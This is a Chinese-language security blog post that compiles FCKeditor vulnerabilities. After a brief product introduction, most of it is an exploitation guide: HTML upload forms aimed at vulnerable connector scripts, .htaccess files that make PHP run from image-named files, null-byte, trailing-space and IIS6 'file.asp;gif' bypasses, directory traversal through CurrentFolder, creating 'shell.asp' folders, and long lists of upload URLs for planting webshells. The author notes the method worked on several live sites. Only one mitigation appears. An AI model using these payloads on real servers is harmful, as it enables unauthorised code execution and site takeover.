#  Fckeditor编辑器漏洞汇集   
原创 simeon的文章  小兵搞安全   2024-11-16 13:37  
  
1.1Fckeditor简介  
  
FCKeditor（现在通常称为CKEditor）是一个开源的、基于JavaScript的内容编辑器。它最初由Frederico Caldeira Knabben开发，并于2003年首次发布。CKEditor旨在使Web开发者能够在其网站上添加富文本编辑功能，用户无需具备HTML知识即可创建和编辑内容。  
### 1.1.1主要特点  
- **所见即所得 (WYSIWYG) 编辑**  
：CKEditor提供了一个可视化的编辑界面，允许用户直接在页面上进行编辑，效果与最终呈现出来的结果相同。  
  
- **丰富的插件系统**  
：支持通过插件扩展功能，如表格处理、图片上传、链接管理等。  
  
- **跨浏览器兼容性**  
：支持所有主流浏览器，包括Chrome, Firefox, Safari, Edge, 和 Internet Explorer。  
  
- **高度可定制**  
：界面、工具栏和功能都可以根据需要进行配置。  
  
- **易于集成**  
：可以通过简单的API调用集成到各种Web应用程序中。  
  
- **强大的API**  
：提供了一套完整的API，方便开发者对编辑器进行深度定制。  
  
- **开源**  
：采用GPL, LGPL 和 MPL三重许可模式，既适合个人使用也适合商业项目。  
  
### 1.1.2使用场景  
  
CKEditor广泛应用于各种需要富文本输入的场合，比如博客系统、CMS（内容管理系统）、论坛、在线文档编辑等。  
### 1.1.3发展历程  
  
随着技术的发展，CKEditor经历了多次迭代更新，每个版本都带来了性能优化、新特性和安全性改进。例如，CKEditor 4 是一个成熟的版本，而 CKEditor 5 则引入了全新的架构，提供了更好的性能和更灵活的插件机制。  
  
CKEditor 4下载地址：  
https://ckeditor.com/ckeditor-4/download/#ckeditor-4-lts  
  
CKEditor 5下载地址：  
https://ckeditor.com/ckeditor-5/download/  
  
Fckeditor下载地址：  
  
https://sourceforge.net/projects/fckeditor/files/  
## 1.2Fckeditor历史漏洞  
### 1.2.1FCKEditor Core ASP 2.6.8 任意文件上传保护绕过漏洞  
  
FCKEditor 2.6.8 ASP 版本在处理重复文件时没有正确验证文件扩展名。这使得攻击者可以绕过文件上传保护，上传任何扩展名的文件，可能导致任意代码执行。  
  
1.漏洞详情  
  
易受攻击的文件: commands.asp  
  
函数: FileUpload()  
  
易受攻击的代码:  
  
sFileName = RemoveExtension(sOriginalFileName) & "(" & iCounter & ")." & sExtension  
  
2.利用方法  
  
空字符绕过: 攻击者可以使用空字符 (\0) 绕过扩展名验证。  
  
IIS6 模式: 运行在 IIS6 上的应用程序可以使用 file.asp;gif 模式上传恶意文件。  
  
3.解决方案  
  
为了缓解此漏洞，需要修改 config.asp 文件以强制执行严格的文件扩展名验证。找到 config.asp 文件，位于你的 FCKEditor 安装目录中。  
  
找到以下行:  
  
ConfigAllowedExtensions.Add "File", "Extensions Here"  
  
将其替换为:  
  
ConfigAllowedExtensions.Add "File", "^(Extensions Here)$"  
  
漏洞详情参考链接地址：  
  
https://www.exploit-db.com/exploits/23005  
### 1.2.2FCKeditor 所有版本任意文件上传漏洞  
  
1.漏洞简介  
  
FCKeditor 所有版本存在任意文件上传漏洞，攻击者可以通过此漏洞上传任意文件（如 PHP 脚本），从而在服务器上执行任意代码。漏洞详情参考链接地址  
  
https://www.exploit-db.com/exploits/17644  
  
2.漏洞利用步骤  
  
（1）创建一个 .htaccess 文件：  
  
代码:  
  
<FilesMatch "_php\.gif">  
  
SetHandler application/x-httpd-php  
  
</FilesMatch>  
  
（2）现在使用 FCKeditor 上传这个 .htaccess 文件。  
  
http://target.com/FCKeditor/editor/filemanager/upload/test.html  
  
http://target.com/FCKeditor/editor/filemanager/browser/default/connectors/test.html  
  
（3）现在使用 FCKeditor 上传 shell.php.gif。  
  
上传 shell.php.gif 后，文件名会自动变为 shell_php.gif。  
  
（4）现在可以从服务器访问 shell。  
  
http://target.com/anything/shell_php.gif  
### 1.2.3FCKEditor Core 2.x 2.4.3 - 'FileManager upload.php' 任意文件上传漏洞  
  
1.漏洞概述  
  
FCKEditor  2.x 版本（特别是 2.4.3 及之前的版本）存在一个严重的安全漏洞，允许攻击者通过 FileManager 组件中的 upload.php 脚本上传任意文件，包括恶意的 PHP 脚本文件。这可能导致远程代码执行 (RCE)，从而使攻击者能够完全控制服务器。  
  
2.影响版本  
  
FCKEditor 2.x <= 2.4.3  
  
3.漏洞详情  
  
在 FCKeditor/editor/filemanager/connectors/php/upload.php 文件中，存在一个文件上传功能，该功能没有正确地验证上传文件的类型和扩展名，导致攻击者可以通过以下方式绕过文件类型检查：  
  
（1）版本 2.0 - 2.2：  
  
在 upload.php 文件中，Type 参数的值没有进行严格的验证，可以传递任意值。  
  
如果传递的 Type 值不在 File, Flash, Image 之中，系统不会加载相应的扩展名过滤规则，从而允许上传任意文件。  
  
（3）版本 2.3.0 - 2.4.3：  
  
虽然增加了对 Type 参数的验证，但 Media 类型的扩展名过滤规则在 config.php 中未定义。  
  
因此，攻击者可以通过设置 Type=Media 来绕过文件类型检查，上传任意文件。  
  
4.利用方法  
  
以下是一个简单的 HTML 表单，用于演示如何利用此漏洞上传任意文件：  
  
<form enctype="multipart/form-data" action="  
http://example.com/FCKeditor/editor/filemanager/connectors/php/upload.php?Type=Media"  
 method="post">  
  
    <input name="NewFile" type="file">  
  
    <input type="submit" value="提交">  
  
</form>  
### 1.2.4FCKEditor Core - 'FileManager test.html' 任意文件上传漏洞   
  
1.漏洞简介  
  
FCKEditor 存在一个严重的安全漏洞，允许攻击者通过 FileManager 组件中的 test.html 文件上传任意文件，包括恶意的 PHP 脚本文件。这可能导致远程代码执行 (RCE)，从而使攻击者能够完全控制服务器。  
  
2.影响版本  
  
FCKEditor 2.x 版本  
  
3.漏洞详情  
  
在 FCKeditor/editor/filemanager/connectors/test.html 文件中，存在一个文件上传功能，该功能没有正确地验证上传文件的类型和扩展名，导致攻击者可以通过以下方式绕过文件类型检查：  
  
任意文件上传：  
  
test.html 文件中的上传功能没有严格验证文件类型和扩展名，允许上传任意文件。  
  
攻击者可以上传一个带有恶意代码的文件（如 shell.php），并在服务器上执行。  
  
4.利用方法  
  
以下是一个简单的 HTML 表单，用于演示如何利用此漏洞上传任意文件：  
  
<form enctype="multipart/form-data" action="  
http://example.com/FCKeditor/editor/filemanager/connectors/test.html?Command=QuickUpload&Type=File"  
 method="post">  
  
    <input name="newfile" type="file">  
  
    <input type="submit" value="提交">  
  
</form>  
### 1.2.5FCKEditor 2.0 <= 2.2 - 'FileManager connector.php' 任意文件上传漏洞  
  
1.漏洞概述  
  
FCKEditor 2.0 到 2.2 版本存在一个严重的安全漏洞，允许攻击者通过 FileManager 组件中的 connector.php 脚本上传任意文件，包括恶意的 PHP 脚本文件。这可能导致远程代码执行 (RCE)，从而使攻击者能够完全控制服务器。  
  
2.影响版本  
  
FCKEditor 2.0 <= 2.2  
  
3.漏洞详情  
  
在 FCKeditor/editor/filemanager/connectors/php/connector.php 文件中，存在一个文件上传功能，该功能没有正确地验证上传文件的类型和扩展名，导致攻击者可以通过以下方式绕过文件类型检查：  
  
任意文件上传：  
  
connector.php 文件中的上传功能没有严格验证文件类型和扩展名，允许上传任意文件。  
  
攻击者可以上传一个带有恶意代码的文件（如 shell.php），并在服务器上执行。  
  
利用脚本下载地址：  
https://www.exploit-db.com/exploits/1484  
## 1.3Fckeditor漏洞利用小结  
### 1.3.1FCKeditor重要信息收集  
  
（  
1  
）  
FCKeditor  
编辑器页  
  
FCKeditor/_samples/default.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSicu93ZnTHulUp68YUMzTAdRFYcPblA2T46O89ylAcNUw5GCnjjtrCZWw/640?wx_fmt=png&from=appmsg "")  
  
  
  
（  
2  
）查看编辑器版本  
  
FCKeditor/editor/dialog/fck_about.html  
  
FCKeditor/_whatsnew.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSictBcgRwibFatWHBPHbkFrVQArnc02Rw7zKTsbWR6Fbk4TJFlwt5krRtQ/640?wx_fmt=png&from=appmsg "")  
  
（3）查看文件上传路径  
  
fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSicOdk931MOVwGKFx1RaGsQqicsBBsuMmib1r2ZWfBLFEgNRkicdu0Lfo6nA/640?wx_fmt=png&from=appmsg "")  
  
（4）.FCKeditor被动限制策略所导致的过滤不严问题  
  
小于等于  
FCKeditor v2.4.3  
版本中  
File  
类别默认拒绝上传类型：  
html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm  
  
Fckeditor 2.0 <= 2.2  
允许上传  
asa  
、  
cer  
、  
php2  
、  
php4  
、  
inc  
、  
pwml  
、  
pht  
后缀的文件  
  
上传后它保存的文件直接用的  
$sFilePath = $sServerDir . $sFileName  
，而没有使用  
$sExtension  
为后缀，直接导致在  
win  
下在上传文件后面加个  
.  
来突破。  
  
（5）.利用2003路径解析漏洞上传网马  
  
利用  
2003  
系统路径解析漏洞的原理，创建类似“  
1.asp  
”目录，再在此目录中上传文件即可被脚本解释器以相应脚本权限执行。  
  
fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/asp/connector.asp   
  
（6）.FCKeditor PHP上传任意文件漏洞  
  
影响版本  
: FCKeditor 2.2 <= FCKeditor 2.4.2  
，  
FCKeditor  
在处理文件上传时存在输入验证错误，远程攻击可以利用此漏洞上传任意文件。在通过  
editor/filemanager/upload/php/upload.php  
上传文件时攻击者可以通过为  
Type  
参数定义无效的值导致上传任意脚本。成功攻击要求  
config.php  
配置文件中启用文件上传，而默认是禁用的。  
  
将一下代码保存为  
html  
文件，并修改  
action  
后的地址为网站实际地址。  
  
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head><body><form id="frmUpload" enctype="multipart/form-data" action="http://www.test.com/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media" method="post">  
  
Upload a new file:<br>  
  
<input type="file" name="NewFile" size="50"><br>  
  
<input id="btnUpload" type="submit" value="Upload">  
  
</form></body></html>  
  
（7）.TYPE自定义变量任意上传文件漏洞  
  
通过自定义  
Type  
变量的参数，可以创建或上传文件到指定的目录中去，且没有上传文件格式的限制。  
  
/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.asp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSic6feMIBfd4OQNSib3c2wRfzLakQZklYT97tVicXKicGSpR1XibxzQgEW6XQ/640?wx_fmt=png&from=appmsg "")  
  
注意出现这个需要登录后台后再上传。  
  
打开这个地址就可以上传任何类型的文件了，  
Shell  
上传到的默认位置是  
:  
  
http://www.URL.com/UserFiles/all/1.asp  
，  
"Type=all"   
这个变量是自定义的，在这里创建了  
all  
这个目录，而且新的目录没有上传文件格式的限制。比如输入  
:  
  
/FCKeditor/editor/filemanager/browser/default/browser.html?Type=../&Connector=connectors/asp/connector.asp  
  
网马就可以传到网站的根目录下。  
  
（8）.aspx版FCKeditor 新闻组件遍历目录漏洞  
  
修改  
CurrentFolder  
参数使用  
 ../../  
来进入不同的目录  
  
/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=aspx.asp   
  
根据返回的  
XML  
信息可以查看网站所有的目录。  
  
/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F   
  
（9）FCKeditor中test上传方式及sample上传  
  
如果存在以下文件，打开后即可上传文件。  
  
FCKeditor/editor/filemanager/browser/default/connectors/test.html  
  
FCKeditor/editor/filemanager/upload/test.html  
  
FCKeditor/editor/filemanager/connectors/test.html  
  
FCKeditor/editor/filemanager/connectors/uploadtest.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSicZWLsJic0V5f7xKq6rOXTlVxQWKVASmvvlzh4InH6Tuohwz2KI9oa6UQ/640?wx_fmt=png&from=appmsg "")  
  
sample上传地址：  
  
FCKeditor/_samples/default.html  
  
FCKeditor/_samples/asp/sample01.asp  
  
FCKeditor/_samples/asp/sample02.asp  
  
FCKeditor/_samples/asp/sample03.asp  
  
FCKeditor/_samples/asp/sample04.asp  
  
（10）.FCKeditor 文件上传“.”变“_”下划线的绕过方法：  
  
上传的文件例如：  
shell.php.rar  
或  
shell.php;.jpg  
会变为  
shell_php;.jpg  
这是新版  
FCK  
的变化。  
  
提交  
1.php+  
空格就可以绕过去所有的，不过空格只支持  
win  
系统  
linux  
是不支持的（  
1.php  
和  
1.php+  
空格是  
2  
个不同的文件）  
  
（11）“.htaccess”文件图片上传。  
  
通过一个  
.htaccess   
文件调用  
 php   
的解析器去解析一个文件名中只要包含  
"haha"  
这个字符串的任意文件，所以无论文件名是什么样子，只要包含  
"haha"  
这个字符串，都可以被以  
 php   
的方式来解析，是不是相当邪恶，一个自定义的  
.htaccess   
文件就可以以各种各样的方式去绕过很多上传验证机制，建一个  
.htaccess   
文件，里面的内容如下：  
  
<FilesMatch "haha">  
  
SetHandler application/x-httpd-php  
  
</FilesMatch>  
  
通过Fckeditor将其上传，然后再上传一个包含haha名称的木马文件，即可获取webshell。也可以将其修改为jpg，然后上传一个图片木马即可获取webshell。  
  
（12） 突破建立文件夹  
  
FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=%2Fshell.asp&NewFolderName=z&uuid=1244789975684  
  
访问后会创建一个shell.asp及z的文件夹。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSicgZs4trsyGuTXVYD3uFzBWdibicOPAO7wy0XreV1xeSMsibTJLQeG7hHnQ/640?wx_fmt=png&from=appmsg "")  
  
http://www.xxxx.com/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.xxxx.com/fckeditor/editor/filemanager/connectors/asp/connector.asp  
  
然后可以对image文件夹进行浏览及上传  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSic1lklvlRAQU5rCUIMv4mvaubIVAbhUjxuJ96pibk9FjoroQEdib5A0DQw/640?wx_fmt=png&from=appmsg "")  
  
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp  
  
（13）常用上传地址  
  
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/  
  
FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp  
  
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php  
  
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/Fconnector.asp  
  
 (ver:2.6.3 测试通过)  
  
JSP 版：  
  
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp  
  
注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文  
  
件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。  
  
（13）列目录漏洞也可助找上传地址  
  
修改CurrentFolder 参数使用 ../../来进入不同的目录，Version 2.4.1 测试通过  
  
/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=shell.asp  
  
根据返回的XML 信息可以查看网站所有的目录。  
  
FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F  
  
也可以直接浏览盘符：  
  
JSP 版本：  
  
FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F  
  
（14）FCK编辑器jsp版本漏洞  
  
http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=Image&CurrentFolder=%2F  
  
上传马所在目录  
  
FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/  
  
上传shell的地址:  
  
http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector  
  
跟版本有关系.并不是百分百成功. 测试成功几个站.  
  
不能通杀.很遗憾.  
  
http://www.****.com/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector  
## 1.3资产收集系统利用  
  
FCKeditor/_samples/default.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VHdfelM9otbJ3Wb0XCdiacSiczZ3GiczX7eMmvT1YUr8oa69qD21mzgbicjGBO01m4WVJIUkHcs6pePsA/640?wx_fmt=png&from=appmsg "")  
  
url_load:"/FCKeditor/"  
  
  
  
  
  
